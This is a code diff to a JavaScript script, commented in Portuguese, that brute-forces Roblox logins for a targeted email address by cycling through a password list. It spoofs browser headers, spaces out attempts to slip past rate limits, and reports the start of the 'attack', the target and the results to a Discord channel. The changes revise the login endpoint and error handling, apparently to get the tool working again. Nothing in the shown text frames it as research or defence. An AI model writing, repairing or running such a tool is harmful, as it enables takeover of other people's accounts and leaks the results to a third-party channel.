@@ -26,92 +26,71 @@ async function sendDiscordMessage(content) {
     }
 }
 
-// Função para tentar Login no Roblox (Método Atualizado com Debug)
-async function tryRobloxLogin(email, password, isFirstTry) {
-    const baseUrl = "https://www.roblox.com";
-    
-    // Usar a API moderna de login do Roblox
-    const loginUrl = "https://www.roblox.com/mobileapi/userinfo"; // Esta API é mais simples para teste
-    // Ou a API clássica: "https://www.roblox.com/users/login"
-    
-    // Vamos tentar a API clássica com headers mais completos
-    const robloxClient = axios.create({
-        baseURL: baseUrl,
-        timeout: 10000,
-        headers: {
-            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
-            'Accept': 'application/json',
-            'X-Requested-With': 'XMLHttpRequest',
-            'Referer': 'https://www.roblox.com/login'
-        },
-        withCredentials: true // Importante para cookies
-    });
+// Função para tentar Login no Roblox (CORRIGIDO PARA O 404)
+async function tryRobloxLogin(email, password) {
+    // Usar a API direta do Roblox
+    const loginUrl = "https://www.roblox.com/users/login";
+
+    // Headers mais completos para simular um navegador real
+    const headers = {
+        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+        'Accept': 'application/json, text/javascript, */*; q=0.01',
+        'Content-Type': 'application/json; charset=utf-8',
+        'X-Requested-With': 'XMLHttpRequest',
+        'Referer': 'https://www.roblox.com/login',
+        'Origin': 'https://www.roblox.com',
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-origin'
+    };
 
     try {
-        // 1. Pegar Cookies iniciais (Essencial para o Roblox)
-        const getResponse = await robloxClient.get('/');
+        // 1. Pegar Cookies iniciais (Crítico para o Roblox não dar 404)
+        const client = axios.create({
+            baseURL: 'https://www.roblox.com',
+            headers: headers,
+            withCredentials: true
+        });
+
+        // Fazer um GET no home para pegar o cookie .ROBLOSECURITY ou PHPSESSID
+        await client.get('/');
         
         // 2. Tentar fazer Login
-        // Nota: O Roblox às vezes exige que o email tenha um prefixo ou que se use o Username
-        const response = await robloxClient.post('/users/login', {
+        const response = await client.post('/users/login', {
             username: email,
             password: password
-        }, {
-            headers: { 'Content-Type': 'application/json' },
-            validateStatus: status => status < 500 // Aceitar 200, 400, 401, etc.
         });
 
         const data = response.data;
-        
-        // Se for a primeira tentativa, enviar o JSON COMPLETO no Discord para debug
-        if (isFirstTry) {
-            const debugMsg = `**🐛 DEBUG DA RESPOSTA DO ROBLOX:**\n\`\`\`json\n${JSON.stringify(data, null, 2)}\n\`\`\`\n**Status Code:** ${response.status}`;
-            await sendDiscordMessage(debugMsg);
-        }
 
-        // Verificar se houve sucesso
-        // O Roblox retorna { id: number, username: string } em sucesso
-        if (data.id && typeof data.id === 'number') {
+        // Sucesso: O Roblox retorna um objeto com 'id' e 'username'
+        if (data.id) {
             return {
                 success: true,
                 username: data.username,
                 userId: data.id,
                 error: "Sucesso"
             };
-        } 
-        // Às vezes o erro vem em data.error ou data.errors[0].message
-        else if (data.error) {
+        } else {
+            // Erro comum: { error: "Password is incorrect" }
             return {
                 success: false,
                 username: email,
-                userId: null,
-                error: data.error
-            };
-        }
-        else if (data.errors && data.errors[0]) {
-            return {
-                success: false,
-                username: email,
-                userId: null,
-                error: data.errors[0].message || "Erro Desconhecido"
-            };
-        }
-        else {
-            // Se nada bater, retornar o JSON todo como erro
-            return {
-                success: false,
-                username: email,
-                userId: null,
-                error: "Resposta Estranha: " + JSON.stringify(data)
+                userId: data.id || null,
+                error: data.error || "Erro Desconhecido"
             };
         }
 
     } catch (error) {
+        // Se der erro de rede ou status diferente de 200
+        const status = error.response ? error.response.status : 'Sem Status';
+        const msg = error.response ? JSON.stringify(error.response.data) : error.message;
+        
         return {
             success: false,
             username: email,
             userId: null,
-            error: "Exceção: " + (error.message || "Timeout/Conexão")
+            error: `Erro HTTP ${status}: ${msg}`
         };
     }
 }
@@ -135,7 +114,7 @@ async function startBruteForce(email) {
     }
 
     console.log(`Iniciando ataque em: ${email} com ${passwords.length} senhas...`);
-    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}\n*Vou enviar o DEBUG da primeira tentativa no Discord...*`);
+    await sendDiscordMessage(`**🚀 INÍCIO DO ATAQUE**\n**Alvo:** ${email}\n**Total de Senhas:** ${passwords.length}`);
 
     let found = false;
 
@@ -143,10 +122,7 @@ async function startBruteForce(email) {
     for (const password of passwords) {
         if (found) break;
 
-        // Só faz debug detalhado na primeira tentativa para não encher o Discord
-        const isFirstTry = true; 
-
-        const result = await tryRobloxLogin(email, password, isFirstTry);
+        const result = await tryRobloxLogin(email, password);
 
         if (result.success) {
             found = true;
@@ -159,8 +135,8 @@ async function startBruteForce(email) {
             await sendDiscordMessage(errorMsg);
         }
 
-        // Pausa maior para evitar o "Rate Limit" do Roblox
-        await new Promise(r => setTimeout(r, 3000)); 
+        // Pausa para não bloquear o Email no Roblox (Rate Limit)
+        await new Promise(r => setTimeout(r, 2000)); 
     }
 
     if (!found) {
